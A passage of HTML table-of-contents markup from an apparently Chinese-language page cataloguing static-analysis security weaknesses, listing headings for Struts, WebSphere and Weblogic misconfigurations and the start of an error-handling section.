class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-210"><span class="toc-number">1.4.70.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-209"><span class="toc-number">1.4.70.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Bean-Type"><span class="toc-number">1.4.71.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Bean Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-211"><span class="toc-number">1.4.71.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-212"><span class="toc-number">1.4.71.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-211"><span class="toc-number">1.4.71.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-210"><span class="toc-number">1.4.71.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Property-Type"><span class="toc-number">1.4.72.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Property Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-212"><span class="toc-number">1.4.72.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-213"><span class="toc-number">1.4.72.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-212"><span class="toc-number">1.4.72.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-211"><span class="toc-number">1.4.72.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Forward-Name"><span class="toc-number">1.4.73.</span> <span class="toc-text">Struts Misconfiguration: Missing Forward Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-213"><span class="toc-number">1.4.73.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-214"><span class="toc-number">1.4.73.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-213"><span class="toc-number">1.4.73.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-212"><span class="toc-number">1.4.73.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Forward-Path"><span class="toc-number">1.4.74.</span> <span class="toc-text">Struts Misconfiguration: Missing Forward Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-214"><span class="toc-number">1.4.74.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-215"><span class="toc-number">1.4.74.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-214"><span class="toc-number">1.4.74.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-213"><span class="toc-number">1.4.74.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Misconfiguration-Missing-Nonce"><span class="toc-number">1.4.75.</span> <span class="toc-text">WebSphere Misconfiguration: Missing Nonce</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-215"><span class="toc-number">1.4.75.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-216"><span class="toc-number">1.4.75.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-215"><span class="toc-number">1.4.75.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-214"><span class="toc-number">1.4.75.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Misconfiguration-Servlets-Served-By-Class-Name"><span class="toc-number">1.4.76.</span> <span class="toc-text">WebSphere Misconfiguration: Servlets Served By Class Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-216"><span class="toc-number">1.4.76.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-217"><span class="toc-number">1.4.76.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-216"><span class="toc-number">1.4.76.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-215"><span class="toc-number">1.4.76.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.77.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-217"><span class="toc-number">1.4.77.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-218"><span class="toc-number">1.4.77.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-217"><span class="toc-number">1.4.77.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-216"><span class="toc-number">1.4.77.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.78.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-218"><span class="toc-number">1.4.78.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-219"><span class="toc-number">1.4.78.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-218"><span class="toc-number">1.4.78.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-217"><span class="toc-number">1.4.78.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Signature"><span class="toc-number">1.4.79.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Inbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-219"><span class="toc-number">1.4.79.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-220"><span class="toc-number">1.4.79.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-219"><span class="toc-number">1.4.79.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-218"><span class="toc-number">1.4.79.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.80.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-220"><span class="toc-number">1.4.80.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-221"><span class="toc-number">1.4.80.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-220"><span class="toc-number">1.4.80.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-219"><span class="toc-number">1.4.80.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.81.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-221"><span class="toc-number">1.4.81.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-222"><span class="toc-number">1.4.81.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-221"><span class="toc-number">1.4.81.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-220"><span class="toc-number">1.4.81.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.82.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-222"><span class="toc-number">1.4.82.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-223"><span class="toc-number">1.4.82.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-222"><span class="toc-number">1.4.82.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-221"><span class="toc-number">1.4.82.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.83.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-223"><span class="toc-number">1.4.83.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-224"><span class="toc-number">1.4.83.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-223"><span class="toc-number">1.4.83.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-222"><span class="toc-number">1.4.83.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Timestamp-Expiration"><span class="toc-number">1.4.84.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Timestamp Expiration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-224"><span class="toc-number">1.4.84.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-225"><span class="toc-number">1.4.84.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-224"><span class="toc-number">1.4.84.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-223"><span class="toc-number">1.4.84.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.85.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-225"><span class="toc-number">1.4.85.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-226"><span class="toc-number">1.4.85.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-225"><span class="toc-number">1.4.85.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-224"><span class="toc-number">1.4.85.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.86.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-226"><span class="toc-number">1.4.86.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-227"><span class="toc-number">1.4.86.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-226"><span class="toc-number">1.4.86.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-225"><span class="toc-number">1.4.86.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.87.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-227"><span class="toc-number">1.4.87.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-228"><span class="toc-number">1.4.87.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-227"><span class="toc-number">1.4.87.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-226"><span class="toc-number">1.4.87.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Weak-Token"><span class="toc-number">1.4.88.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-228"><span class="toc-number">1.4.88.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-229"><span class="toc-number">1.4.88.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-228"><span class="toc-number">1.4.88.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-227"><span class="toc-number">1.4.88.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.89.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-229"><span class="toc-number">1.4.89.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-230"><span class="toc-number">1.4.89.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-229"><span class="toc-number">1.4.89.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-228"><span class="toc-number">1.4.89.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.90.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-230"><span class="toc-number">1.4.90.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-231"><span class="toc-number">1.4.90.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-230"><span class="toc-number">1.4.90.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-229"><span class="toc-number">1.4.90.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption-1"><span class="toc-number">1.4.91.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-231"><span class="toc-number">1.4.91.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-232"><span class="toc-number">1.4.91.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-231"><span class="toc-number">1.4.91.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-230"><span class="toc-number">1.4.91.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.92.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-232"><span class="toc-number">1.4.92.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-233"><span class="toc-number">1.4.92.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-232"><span class="toc-number">1.4.92.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-231"><span class="toc-number">1.4.92.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.93.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-233"><span class="toc-number">1.4.93.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-234"><span class="toc-number">1.4.93.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-233"><span class="toc-number">1.4.93.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-232"><span class="toc-number">1.4.93.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.94.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-234"><span class="toc-number">1.4.94.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-235"><span class="toc-number">1.4.94.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-234"><span class="toc-number">1.4.94.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-233"><span class="toc-number">1.4.94.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.95.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-235"><span class="toc-number">1.4.95.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-236"><span class="toc-number">1.4.95.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-235"><span class="toc-number">1.4.95.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-234"><span class="toc-number">1.4.95.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Timestamp-Expiration"><span class="toc-number">1.4.96.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Timestamp Expiration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-236"><span class="toc-number">1.4.96.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-237"><span class="toc-number">1.4.96.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-236"><span class="toc-number">1.4.96.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-235"><span class="toc-number">1.4.96.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.97.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-237"><span class="toc-number">1.4.97.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-238"><span class="toc-number">1.4.97.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-237"><span class="toc-number">1.4.97.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-236"><span class="toc-number">1.4.97.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.98.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-238"><span class="toc-number">1.4.98.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-239"><span class="toc-number">1.4.98.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-238"><span class="toc-number">1.4.98.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-237"><span class="toc-number">1.4.98.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.99.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-239"><span class="toc-number">1.4.99.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-240"><span class="toc-number">1.4.99.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-239"><span class="toc-number">1.4.99.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-238"><span class="toc-number">1.4.99.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Weak-Token"><span class="toc-number">1.4.100.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-240"><span class="toc-number">1.4.100.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-241"><span class="toc-number">1.4.100.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-240"><span class="toc-number">1.4.100.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-239"><span class="toc-number">1.4.100.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weblogic-Misconfiguration-Missing-Timestamp"><span class="toc-number">1.4.101.</span> <span class="toc-text">Weblogic Misconfiguration: Missing Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-241"><span class="toc-number">1.4.101.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-242"><span class="toc-number">1.4.101.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-241"><span class="toc-number">1.4.101.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-240"><span class="toc-number">1.4.101.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weblogic-Misconfiguration-Weak-Token"><span class="toc-number">1.4.102.</span> <span class="toc-text">Weblogic Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-242"><span class="toc-number">1.4.102.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-243"><span class="toc-number">1.4.102.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-242"><span class="toc-number">1.4.102.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-241"><span class="toc-number">1.4.102.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#异常处理"><span class="toc-number">1.5.</span> <span class="toc-text">异常处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Empty-Catch-Block"><span class="toc-number">1.5.1.</span> <span class="toc-text">Poor Error Handling: Empty Catch Block</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-243"><span 